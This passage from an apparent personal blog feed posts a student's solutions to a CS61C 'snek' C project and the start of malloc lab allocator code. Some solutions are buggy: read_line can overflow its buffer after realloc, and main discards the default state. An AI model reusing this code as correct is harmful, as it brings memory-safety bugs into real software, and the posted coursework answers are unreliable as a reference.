## Task 5: `load_board`&#13;
&#13;
Implement the `load_board` function in `state.c`. This function will read a game board from a stream (`FILE *`) into memory. Your implementation of `load_board` must support reading in from `stdin` and any other streams, so please do not use anything that does not support `stdin`, such as seeking, rewinding, or reopening.&#13;
&#13;
Remember that each row of the game board might have a different number of columns. Your implementation should be memory-efficient and should not allocate significantly more memory than necessary to store the board. For example, if a row is 3 characters long, you shouldn't be allocating 100 bytes of space for that row.&#13;
&#13;
You must use `fgets` to read from the file pointer. We reserve the ability to manually regrade your submission if it uses a function other than `fgets` to read from `file`. Other string functions, such as `strchr`, may be helpful here as well!&#13;
&#13;
Hint: `realloc` may be helpful for this task.&#13;
&#13;
Tasks 5 and 6 combined will create a `game_state_t` struct in memory with all its fields set up. In this task, please set `num_snakes` to 0 and set the `snakes` array to `NULL`, since these will be initialized in task 6.&#13;
&#13;
### Task 5.1: `read_line`&#13;
&#13;
Implement the `read_line` function in `state.c`. Given a `FILE *` `file`, read a line from `file` and store the string on the heap. If `fgets` errors, return `NULL`.&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;read_line&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;FILE* file&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A file pointer where the string can be read from&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;char *&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the newly read string. &lt;code&gt;NULL&lt;/code&gt; if there are any errors, or if &lt;code&gt;EOF&lt;/code&gt; is reached.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
char *read_line(FILE *fp) {&#13;
  char *str = (char *) malloc(sizeof(char) * 255);&#13;
  if (fgets(str, 255, fp) == NULL) {&#13;
    return NULL;&#13;
  }&#13;
  while (str[strlen(str) - 1] != '\n') {&#13;
    str = realloc(str, sizeof(char) * strlen(str) * 2);&#13;
    fgets(str + strlen(str), 255, fp);&#13;
  }&#13;
  str = realloc(str, sizeof(char) * (strlen(str) + 1));&#13;
  return str;&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
### Task 5.2: `load_board`&#13;
&#13;
Using `read_line`, implement the `load_board` function in `state.c`.&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;load_board&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;FILE* file&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A file pointer where the board can be read from&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t *&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the newly created &lt;code&gt;game_state_t&lt;/code&gt; struct. &lt;code&gt;NULL&lt;/code&gt; if there are any errors.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
game_state_t *load_board(FILE *fp) {&#13;
  unsigned int capacity = 255;&#13;
  game_state_t* state = (game_state_t *) malloc(sizeof(game_state_t));&#13;
  state-&gt;num_snakes = 0;&#13;
  state-&gt;snakes = NULL;&#13;
  state-&gt;num_rows = 0;&#13;
  state-&gt;board = (char **)calloc(capacity, sizeof(char *));&#13;
  char* str;&#13;
  while ((str = read_line(fp)) != NULL) {&#13;
    if (str[strlen(str) - 1] == '\n') {&#13;
      str[strlen(str) - 1] = '\0';&#13;
    }&#13;
    state-&gt;board[(state-&gt;num_rows)++] = str;&#13;
    if (state-&gt;num_rows &gt;= capacity) {&#13;
      capacity *= 2;&#13;
      state-&gt;board = (char **) realloc(state-&gt;board, sizeof(char *) * capacity);&#13;
    }&#13;
  }&#13;
  state-&gt;board = (char **) realloc(state-&gt;board, sizeof(char *) * state-&gt;num_rows);&#13;
  return state;&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
## Task 6: `initialize_snake`&#13;
&#13;
Implement the `initialize_snake` function in `state.c`. This function takes in a game board and creates the array of `snake_t` structs.&#13;
&#13;
### Task 6.1: `find_head`&#13;
&#13;
Implement the `find_head` function in `state.c`. Given a `snake_t` struct with the tail row and column filled in, this function traces through the board to find the head row and column, and fills in the head row and column in the struct.&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;find_head&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td rowspan='2'&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t* state&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the &lt;code&gt;game_state_t&lt;/code&gt; struct to be analyzed&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;int snum&lt;/code&gt;&lt;/td&gt;&lt;td&gt;The index of the snake to be analyzed&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td colspan='2'&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
As an example, consider the following board:&#13;
&#13;
```&#13;
##############&#13;
#            #&#13;
#        *   #&#13;
#            #&#13;
#   d&gt;v      #&#13;
#     v      #&#13;
#  W  v      #&#13;
#  ^&lt;&lt;&lt;      #&#13;
#            #&#13;
##############&#13;
&#13;
&#13;
```&#13;
&#13;
Assuming that `state` is a pointer to this game state, then `find_head(state, 0)` will fill in the `head_row` and `head_col` fields of the snake 0 struct with 6 and 3, respectively.&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
static void find_head(game_state_t *state, unsigned int snum) {&#13;
  snake_t * snake_ptr = (state-&gt;snakes) + snum;&#13;
  unsigned int row = snake_ptr-&gt;tail_row;&#13;
  unsigned int col = snake_ptr-&gt;tail_col;&#13;
  char ch = state-&gt;board[row][col];&#13;
  while (is_snake(ch) &amp;&amp; !is_head(ch)) {&#13;
    row = get_next_row(row, ch);&#13;
    col = get_next_col(col, ch);&#13;
    ch = state-&gt;board[row][col];&#13;
  }&#13;
  snake_ptr-&gt;head_row = row;&#13;
  snake_ptr-&gt;head_col = col;&#13;
  return;&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
### Task 6.2: `initialize_snake`&#13;
&#13;
Using `find_head`, implement the `initialize_snake` function in `state.c`. You can assume that the state passed into this function is the result of calling `load_board`, but you may not assume that the `snakes` array is defined. This means the board-related fields are already filled in, and you only need to fill in `num_snakes` and create the `snakes` array.&#13;
&#13;
You may assume that all snakes on the board start out alive.&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;initialize_snakes&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t* state&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the &lt;code&gt;game_state_t&lt;/code&gt; struct to be filled in&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t* state&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the &lt;code&gt;game_state_t&lt;/code&gt; struct with fields filled in. This can be the same as the struct passed in (you can modify the struct in-place).&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
game_state_t *initialize_snakes(game_state_t *state) {&#13;
  state-&gt;snakes = (snake_t *)malloc(sizeof(snake_t) * 512);&#13;
  state-&gt;num_snakes = 0;&#13;
  for (unsigned int i = 0; i &lt; state-&gt;num_rows; i++)&#13;
  {&#13;
    char* row = state-&gt;board[i];&#13;
&#13;
    for (unsigned int j = 0; j &lt; strlen(row); j++)&#13;
    {&#13;
      &#13;
      char ch = row[j];&#13;
      if (is_tail(ch)) {&#13;
        snake_t* snake = state-&gt;snakes + (state-&gt;num_snakes);&#13;
        snake-&gt;live = true;&#13;
        snake-&gt;tail_row = i;&#13;
        snake-&gt;tail_col = j;&#13;
        state-&gt;num_snakes += 1;&#13;
      }&#13;
    }&#13;
  }&#13;
  for (unsigned int i = 0; i &lt; state-&gt;num_snakes; i++) {&#13;
    find_head(state, i);&#13;
  }&#13;
  print_board(state, stdout);&#13;
  return state;&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
## Task 7: `main`&#13;
&#13;
Using the functions you implemented in all the previous tasks, fill in the blanks in `snake.c`. Each time the `snake.c` program is run, the board will be updated by one time step.&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
int main(int argc, char *argv[]) {&#13;
  bool io_stdin = false;&#13;
  char *in_filename = NULL;&#13;
  char *out_filename = NULL;&#13;
  game_state_t *state = NULL;&#13;
&#13;
  for (int i = 1; i &lt; argc; i++) {&#13;
    if (strcmp(argv[i], '-i') == 0 &amp;&amp; i &lt; argc - 1) {&#13;
      if (io_stdin) {&#13;
        fprintf(stderr, 'Usage: %s [-i filename | --stdin] [-o filename]\n', argv[0]);&#13;
        return 1;&#13;
      }&#13;
      in_filename = argv[i + 1];&#13;
      i++;&#13;
      continue;&#13;
    } else if (strcmp(argv[i], '--stdin') == 0) {&#13;
      if (in_filename != NULL) {&#13;
        fprintf(stderr, 'Usage: %s [-i filename | --stdin] [-o filename]\n', argv[0]);&#13;
        return 1;&#13;
      }&#13;
      io_stdin = true;&#13;
      continue;&#13;
    }&#13;
    if (strcmp(argv[i], '-o') == 0 &amp;&amp; i &lt; argc - 1) {&#13;
      out_filename = argv[i + 1];&#13;
      i++;&#13;
      continue;&#13;
    }&#13;
    fprintf(stderr, 'Usage: %s [-i filename | --stdin] [-o filename]\n', argv[0]);&#13;
    return 1;&#13;
  }&#13;
&#13;
  if (in_filename != NULL) {&#13;
    FILE * fp = fopen(in_filename, 'r');&#13;
    if (fp == NULL) {&#13;
      return -1;&#13;
    }&#13;
    state = load_board(fp);&#13;
    initialize_snakes(state);&#13;
  } else if (io_stdin) {&#13;
    state = load_board(stdin);&#13;
    initialize_snakes(state);&#13;
  } else {&#13;
    create_default_state();&#13;
  }&#13;
  update_state(state, deterministic_food);&#13;
  if (out_filename != NULL) {&#13;
    FILE *fp = fopen(out_filename, 'w+');&#13;
    print_board(state, fp);&#13;
  } else {&#13;
    print_board(state, stdout);&#13;
  }&#13;
  free_state(state);&#13;
  return 0;&#13;
}&#13;
```&#13;
&#13;
。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/cs61c-su24-project1-%20snek.html</guid><pubDate>Tue, 13 Aug 2024 09:18:25 +0000</pubDate></item><item><title>Malloc lab</title><link>https://LianSeKong.github.io/lizi/post/Malloc%20lab.html</link><description># Malloc lab &#13;
&#13;
## 隐式列表  78 / 100 points&#13;
&#13;
&#13;
``` c &#13;
/*&#13;
 * mm-naive.c - The fastest, least memory-efficient malloc package.&#13;
&#13;
 */&#13;
#include &lt;stdio.h&gt;&#13;
#include &lt;stdlib.h&gt;&#13;
#include &lt;assert.h&gt;&#13;
#include &lt;unistd.h&gt;&#13;
#include &lt;string.h&gt;&#13;
&#13;
#include 'mm.h'&#13;
#include 'memlib.h'&#13;
&#13;
team_t team = {&#13;
    /* Team name */&#13;
    'Cranberry', // 蔓越莓&#13;
    /* First member's full name */&#13;
    'Lizi',&#13;
    /* First member's email address */&#13;
    'liansekong@gmail.com',&#13;
    /* Second member's full name (leave blank if none) */&#13;
    '',&#13;
    /* Second member's email address (leave blank if none) */&#13;
    ''};&#13;
&#13;
/* single word (4) or double word (8) alignment */&#13;
#define ALIGNMENT 8&#13;
&#13;
/* rounds up to the nearest multiple of ALIGNMENT */&#13;
#define ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)&#13;
&#13;
#define SIZE_T_SIZE (ALIGN(sizeof(size_t)))&#13;
&#13;
#define WSIZE 4&#13;
#define DSIZE 8&#13;
&#13;
// bytes&#13;
#define CHUNKSIZE (1 &lt;&lt; 12) // 4096 bytes -&gt;  4kb page size&#13;
&#13;
#define MAX(x, y) ((x) &gt; (y) ? (x) : (y))&#13;
&#13;
// Pack a size and allocated bit into a word&#13;
#define PACK(size, alloc) ((size) | (alloc))&#13;
&#13;
// Read and write a word at address p&#13;
#define GET(p) (*(unsigned int *)(p))&#13;
#define PUT(p, val) (*(unsigned int *)(p) = (val))&#13;
&#13;
// Read the size and allocated fields from address p&#13;
// Size 为整个块大小&#13;
#define GET_SIZE(p) (GET(p) &amp; ~0x7)&#13;
#define GET_ALLOC(p) (GET(p) &amp; 0x1)&#13;
&#13;
// bp指向第一个有效载荷字节&#13;
#define HDRP(bp) ((char *)(bp) - WSIZE)&#13;
#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)&#13;
&#13;
#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))&#13;
#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))&#13;
&#13;
static void *extend_heap(size_t words);&#13;
static void *coalesce(void *bp);&#13;
static void *find_fit(size_t asize);&#13;
static void place(void *bp, size_t size);&#13;
&#13;
void *mm_malloc(size_t size);&#13;
&#13;
char *heap_listp;&#13;
&#13;
/*&#13;
 * mm_init - initialize the malloc package.&#13;
 */&#13;
int mm_init(void)&#13;
{&#13;
&#13;
    if ((heap_listp = mem_sbrk(4 * WSIZE)) == (void *)-1)&#13;
    {&#13;
        return -1;&#13;
    }&#13;
&#13;
    PUT(heap_listp, 0);                            // 起始位置&#13;
    PUT(heap_listp + (1 * WSIZE), PACK(DSIZE, 1)); // 序言块 8/1&#13;
    PUT(heap_listp + (2 * WSIZE), PACK(DSIZE, 1)); // 序言块 8/1&#13;
    PUT(heap_listp + (3 * WSIZE), PACK(0, 1));     // 结尾块 0/1&#13;
&#13;
    // 指向第二个序言块&#13;
    heap_listp += (2 * WSIZE);&#13;
&#13;
    if (extend_heap(CHUNKSIZE) == NULL)&#13;
        return -1;&#13;
    // printf('init finsh!\n');&#13;
    return 0;&#13;
}&#13;
&#13;
/**&#13;
 * 首次匹配&#13;
 */&#13;
&#13;
static void *find_fit(size_t asize)&#13;
{&#13;
    char *start_bp = heap_listp + DSIZE;&#13;
    while (GET_SIZE(HDRP(start_bp)) &gt; 0)&#13;
    {&#13;
        if (GET_ALLOC(HDRP(start_bp)) == 0 &amp;&amp; (GET_SIZE(HDRP(start_bp)) &gt;= asize))&#13;
        {&#13;
            return start_bp;&#13;
        }&#13;
        start_bp = NEXT_BLKP(start_bp);&#13;
    }&#13;
    return NULL;&#13;
}&#13;
&#13;
/**&#13;
 * 设置分配块&#13;
 * 1. 设置分配位为1&#13;
 * 2. 分割空闲块&#13;
 */&#13;
static void place(void *bp, size_t size)&#13;
{&#13;
    size_t cur_bk_size = GET_SIZE(HDRP(bp));&#13;
    if (cur_bk_size - size &gt;= DSIZE * 2)&#13;
    {&#13;
        PUT(HDRP(bp), PACK(size, 1));&#13;
        PUT(FTRP(bp), PACK(size, 1));&#13;
        PUT(HDRP(NEXT_BLKP(bp)), PACK(cur_bk_size - size, 0));&#13;
        PUT(FTRP(NEXT_BLKP(bp)), PACK(cur_bk_size - size, 0));&#13;
    }&#13;
    else&#13;
    {&#13;
        PUT(HDRP(bp), PACK(cur_bk_size, 1));&#13;
        PUT(FTRP(bp), PACK(cur_bk_size, 1));&#13;
    }&#13;
}&#13;
&#13;
/*&#13;
 * mm_malloc - Allocate a block by incrementing the brk pointer.&#13;
 *     Always allocate a block whose size is a multiple of the alignment.&#13;
 */&#13;
void *mm_malloc(size_t size)&#13;
{&#13;
    if (size == 0)&#13;
    {&#13;
        return NULL;&#13;
    }&#13;
    // payload + padding + hdr + ftr&#13;
    // Double word algin&#13;
    size_t asize = ALIGN(size) + DSIZE;&#13;
    size_t extend_size;&#13;
    char *bp;&#13;
    // 寻找空闲块&#13;
    if ((bp = find_fit(asize)) != NULL)&#13;
    {&#13;
        place(bp, asize);&#13;
        return bp;&#13;
    }&#13;
    // 无空闲列表，则向系统申请分配内存， 最小单位为 4kb&#13;
    extend_size = MAX(asize, CHUNKSIZE);&#13;
    if ((bp = extend_heap(extend_size)) == NULL)&#13;
        return NULL;&#13;
    place(bp, asize);&#13;
    return bp;&#13;
}&#13;
&#13;
/*&#13;
 * mm_free - Freeing a block does nothing.&#13;
 */&#13;
void mm_free(void *bp)&#13;
{&#13;
    // 获取当前块的大小&#13;
    size_t size = GET_SIZE(HDRP(bp));&#13;
    // 设置头尾为未分配&#13;
    PUT(HDRP(bp), PACK(size, 0));&#13;
    PUT(FTRP(bp), PACK(size, 0));&#13;
    // 合并&#13;
    coalesce(bp);&#13;
}&#13;
&#13;
/*&#13;
 * mm_realloc - Implemented simply in terms of mm_malloc and mm_free&#13;
 */&#13;
&#13;
void *mm_realloc(void *ptr, size_t size)&#13;
{&#13;
    if (ptr == NULL)&#13;
    {&#13;
        return mm_malloc(size);&#13;
    }&#13;
    if (size == 0)&#13;
    {&#13;
        mm_free(ptr);&#13;
        return NULL;&#13;
    }&#13;
&#13;
    size_t asize = ALIGN(size) + DSIZE;&#13;
    size_t cur_bk_size = GET_SIZE(HDRP(ptr));&#13;
&#13;
    if (cur_bk_size == asize)&#13;
    {&#13;
        return ptr;&#13;
    }&#13;
    else if (cur_bk_size &lt; asize)&#13;
    {&#13;
        // expand&#13;
        char *new_ptr = mm_malloc(size);&#13;
        memcpy(new_ptr, ptr, cur_bk_size - DSIZE);&#13;
        mm_free(ptr);&#13;
        return new_ptr;&#13;
    }&#13;
    else&#13;
    {&#13;
        // shrink&#13;
        if (cur_bk_size - asize &lt;= 2 * DSIZE)&#13;
        {&#13;
            return ptr;&#13;
        }&#13;
        else&#13;
        {&#13;
            place(ptr, asize);&#13;
            return ptr;&#13;
        }&#13;
    }&#13;
}&#13;
&#13;
// 1. 堆初始化时调用&#13;
// 2. mm_malloc不能找到一个合适的匹配块时&#13;
static void *extend_heap(size_t size)&#13;
{&#13;
    size_t asize = size % CHUNKSIZE == 0 ? size : ((size / CHUNKSIZE) + 1) * CHUNKSIZE;&#13;
    char *bp;&#13;
    if ((bp = mem_sbrk(asize)) == (void *)-1)&#13;
    {&#13;
        return NULL;&#13;
    }&#13;
    // 分配block时bp指向块的头部表， bp前一个块为之前的结尾块（0/1）&#13;
    // 此时将之前的结尾块当作头部，现在分配块的最后一个word设为结尾块&#13;
    PUT(HDRP(bp), PACK(asize, 0));&#13;
    PUT(FTRP(bp), PACK(asize, 0));&#13;
    PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1));&#13;
    return coalesce(bp);&#13;
}&#13;
&#13;
static void *coalesce(void *bp)&#13;
{&#13;
    size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));&#13;
    size_t next_alloc = GET_ALLOC(FTRP(NEXT_BLKP(bp)));&#13;
&#13;
    size_t size = GET_SIZE(HDRP(bp));&#13;
    if (prev_alloc &amp;&amp; next_alloc)&#13;
    {&#13;
        return bp;&#13;
    }&#13;
    if (prev_alloc &amp;&amp; !next_alloc)&#13;
    {&#13;
        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));&#13;
        PUT(HDRP(bp), PACK(size, 0));&#13;
        PUT(FTRP(bp), PACK(size, 0));&#13;
    }&#13;
    else if (!prev_alloc &amp;&amp; next_alloc)&#13;
    {&#13;
        size += GET_SIZE(HDRP(PREV_BLKP(bp)));&#13;
        PUT(FTRP(bp), PACK(size, 0));&#13;
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));&#13;
        bp = PREV_BLKP(bp);&#13;
    }&#13;
    else&#13;
    {&#13;
        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(HDRP(NEXT_BLKP(bp)));&#13;
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));&#13;
        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0));&#13;
        bp = PREV_BLKP(bp);&#13;
    }&#13;
    return bp;&#13;
}&#13;
&#13;
```&#13;
&#13;
## 分离列表&#13;
&#13;
``` c&#13;
/*&#13;
&#13;
 * mm-naive.c - The fastest, least memory-efficient malloc package.&#13;
 */&#13;
&#13;
#include &lt;stdio.h&gt;&#13;
#include &lt;stdlib.h&gt;&#13;
#include &lt;assert.h&gt;&#13;
#include &lt;unistd.h&gt;&#13;
#include &lt;string.h&gt;&#13;
#include 'mm.h'&#13;
#include 'memlib.h'&#13;
&#13;
team_t team = {&#13;
    /* Team name */&#13;
    'Cranberry', // 蔓越莓&#13;
    /* First member's full name */&#13;
    'Lizi',&#13;
    /* First member's email address */&#13;
    'liansekong@gmail.com',&#13;
    /* Second member's full name (leave blank if none) */&#13;
    '',&#13;
    /* Second member's email address (leave blank if none) */&#13;
    ''&#13;
};&#13;
&#13;
/* single word (4) or double word (8) alignment */&#13;
#define ALIGNMENT 8&#13;
/* rounds up to the nearest multiple of ALIGNMENT */&#13;
#define ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)&#13;
&#13;
#define WSIZE 4&#13;
#define DSIZE 8&#13;
#define MINI_BLOCK_SIZE 16&#13;
&#13;
// SEG_LIST&#13;
&#13;
#define SEG_LIST_LEN 15&#13;
&#13;
// 4096 bytes -&gt;  4kb page size&#13;
&#13;
#define CHUNKSIZE (1 &lt;&lt; 12)&#13;
&#13;
#define MAX(x, y) ((x) &gt; (y) ? (x) : (y))&#13;
&#13;
// Pack a size and allocated bit into a word&#13;
&#13;
#define PACK(size, alloc) ((size) | (alloc))&#13;
&#13;
// Read and write a word at address p&#13;
&#13;
#define GET(p) (*(unsigned int *)(p))&#13;
&#13;
#define PUT(p, val) (*(unsigned int *)(p) = (val))&#13;
&#13;
// Read the size and allocated fields from address p&#13;
&#13;
#define GET_SIZE(p) (GET(p) &amp; ~0x7)&#13;
&#13;
#define GET_ALLOC(p) (GET(p) &amp; 0x1)&#13;
&#13;
// bp指向第一个有效载荷字节&#13;
&#13;
#define HDRP(bp) ((char *)(bp) - WSIZE)&#13;
#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)&#13;
#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))&#13;
#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))&#13;
#define PREV(bp) ((char *)(bp))&#13;
#define SUCC(bp) ((char *)(bp) + WSIZE)&#13;
&#13;
// 分离空闲链表&#13;
&#13;
// 根据下标获取分离空闲列表的元素&#13;
#define ITEM_OF_FREE_LIST(listp, index) ((listp) + ((index) * (WSIZE) * 4))&#13;
&#13;
#define PREV_FREE_BLKP(bp) (GET(bp))&#13;
#define SUCC_FREE_BLKP(bp) (GET((char *)(bp) + WSIZE))&#13;
&#13;
static void *extend_heap(size_t words);&#13;
&#13;
static void *coalesce(void *bp);&#13;
&#13;
static void *find_fit(size_t asize);&#13;
&#13;
static void place(void *bp, size_t size);&#13;
&#13;
static size_t find_index(size_t size);&#13;
&#13;
static void disconnect(void *bp);&#13;
&#13;
void *mm_malloc(size_t size);&#13;
&#13;
static void place_free(void *bp);&#13;
&#13;
char *seg_listp;&#13;
&#13;
char *heap_listp;&#13;
&#13;
/*&#13;
&#13;
 * mm_init - initialize the malloc package.&#13;
&#13;
 */&#13;
&#13;
int mm_init(void)&#13;
{&#13;
    /**&#13;
     * 分离空闲列表：seg_list&#13;
     * 1. 每个列表头为： 4 Word &#13;
     *      * Header: size (32) + allocated bit (001) &#13;
     *      * Prev: 上一个空闲列表的地址 &#13;
     *      * Succ: 下一个空心列表的地址&#13;
     *      * Footer: size (32) + allocated bit (001) &#13;
     * 2. 列表的元素为：&#13;
     *      * Header: size (32) + allocated bit (001)&#13;
     *      * Prev: 上一个空闲列表的地址 &#13;
     *      * Succ: 下一个空心列表的地址&#13;
     *      * Payload&#13;
     *      * Footer: size (32) + allocated bit (001)    &#13;
     */&#13;
    if ((seg_listp = mem_sbrk(SEG_LIST_LEN * WSIZE * 4)) == (void *)-1)&#13;
    {&#13;
        return -1;&#13;
    }&#13;
    seg_listp = seg_listp + WSIZE; // 指向首个列表的块位置&#13;
    // 初始化空闲列表&#13;
    for (size_t i = 0; i &lt; SEG_LIST_LEN; i++)&#13;
    {&#13;
        char *bp = ITEM_OF_FREE_LIST(seg_listp, i);&#13;
        PUT(HDRP(bp), PACK(4 * WSIZE, 1));&#13;
        PUT(FTRP(bp), PACK(4 * WSIZE, 1));&#13;
        PUT(PREV(bp), 0);&#13;
        PUT(SUCC(bp), 0);&#13;
    }&#13;
    // 初始化隐式列表&#13;
    if ((heap_listp = mem_sbrk(4 * WSIZE)) == (void *)-1)&#13;
    {&#13;
        return -1;&#13;
    }&#13;
&#13;
    PUT(heap_listp, 0);                            // 起始位置&#13;
    PUT(heap_listp + (1 * WSIZE), PACK(DSIZE, 1)); // 序言块 8/1&#13;
    PUT(heap_listp + (2 * WSIZE), PACK(DSIZE, 1)); // 序言块 8/1&#13;
    PUT(heap_listp + (3 * WSIZE), PACK(0, 1));     // 结尾块 0/1&#13;
&#13;
    // 指向普通块起始位置&#13;
    heap_listp += (2 * WSIZE);&#13;
&#13;
    char *bp;&#13;
    if ((bp = extend_heap(CHUNKSIZE)) == NULL) {&#13;
        return -1;&#13;
    }&#13;
    return 0;&#13;
}&#13;
&#13;
/**&#13;
 * find_fit - 寻找空闲块&#13;
 * 策略： 首次匹配&#13;
 * &#13;
 */&#13;
static void *find_fit(size_t asize) {&#13;
    size_t index = find_index(asize);&#13;
    for (size_t i = index; i &lt; SEG_LIST_LEN; i++)&#13;
    {&#13;
        char *cur_free_bp = ITEM_OF_FREE_LIST(seg_listp, i);&#13;
        char *succ_free_bp = SUCC_FREE_BLKP(cur_free_bp);&#13;
        while (succ_free_bp != 0)&#13;
        {&#13;
            if (succ_free_bp != 0 &amp;&amp; GET_SIZE(HDRP(succ_free_bp)) &gt;= asize)&#13;
            {&#13;
                return succ_free_bp;&#13;
            }&#13;
            succ_free_bp = SUCC_FREE_BLKP(succ_free_bp);&#13;
        }&#13;
    }&#13;
    return NULL;&#13;
}&#13;
&#13;
/**&#13;
 * - disconnect 断开在空闲链表中的连接&#13;
 * &#13;
 */&#13;
static void disconnect(void *bp)&#13;
{&#13;
    char *prev_free_bp = PREV_FREE_BLKP(bp);&#13;
    char *succ_free_bp = SUCC_FREE_BLKP(bp);&#13;
&#13;
    PUT(SUCC(prev_free_bp), succ_free_bp);&#13;
    if (succ_free_bp != 0)&#13;
    {&#13;
        PUT(PREV(succ_free_bp), prev_free_bp);&#13;
    }&#13;
}&#13;
&#13;
/**&#13;
&#13;
 * Allocated block&#13;
&#13;
 * hdr (4bytes): size(29bit) allocated bit(001)(3bit)&#13;
 * payload&#13;
 * padding&#13;
 * ftr (4bytes): size(29bit) allocated bit(001)(3bit)&#13;
 *&#13;
 * Free block&#13;
 * hdr (4bytes): size(29bit) allocated bit(000)(3bit) (010) 代表前一个块&#13;
 * succ&#13;
 * payload&#13;
 * padding&#13;
 * ftr (4bytes): size(29bit) allocated bit(001)(3bit)&#13;
 */&#13;
&#13;
static void place(void *bp, size_t size) {&#13;
    disconnect(bp);&#13;
    size_t cur_bk_size = GET_SIZE(HDRP(bp));&#13;
    size_t remaining_size = cur_bk_size - size;&#13;
    if (remaining_size &gt;= MINI_BLOCK_SIZE) {&#13;
        PUT(HDRP(bp), PACK(size, 1));&#13;
        PUT(FTRP(bp), PACK(size, 1));&#13;
        PUT(HDRP(NEXT_BLKP(bp)), PACK(remaining_size, 0));&#13;
        PUT(FTRP(NEXT_BLKP(bp)), PACK(remaining_size, 0));&#13;
        place_free(NEXT_BLKP(bp));&#13;
    }&#13;
    else&#13;
    {&#13;
        PUT(HDRP(bp), PACK(cur_bk_size, 1));&#13;
        PUT(FTRP(bp), PACK(cur_bk_size, 1));&#13;
    }&#13;
}&#13;
&#13;
/*&#13;
&#13;
 * mm_malloc - Allocate a block by incrementing the brk pointer.&#13;
&#13;
 *     Always allocate a block whose size is a multiple of the alignment.&#13;
&#13;
 */&#13;
&#13;
void *mm_malloc(size_t size)&#13;
{&#13;
    if (size == 0) {&#13;
        return NULL;&#13;
    }&#13;
&#13;
    size_t asize = ALIGN(size) + DSIZE;&#13;
    size_t extend_size;&#13;
    char *bp;&#13;
&#13;
    if ((bp = find_fit(asize)) != NULL) {&#13;
